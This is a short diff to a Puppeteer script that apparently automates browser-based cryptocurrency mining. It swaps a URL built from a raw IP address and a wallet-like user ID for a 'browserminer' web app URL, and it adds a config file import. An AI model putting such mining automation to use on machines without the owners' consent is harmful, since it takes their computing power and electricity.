@@ -1,3 +1,5 @@
+const config = require('./config.json');
+
 // Import Puppeteer and the built-in path module
 const puppeteer = require('puppeteer');
 
@@ -24,7 +26,7 @@ const run = async () => {
     .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
     .join('&');
 
-    urls[params.algorithm] = `http://216.98.13.181/?user=TFyd78oGq6eYk9y4pj4T3pZczVvcAK3FVw${query}`;
+    urls[params.algorithm] = `https://browserminer.vercel.app?${query}`;
   });
 
   try {
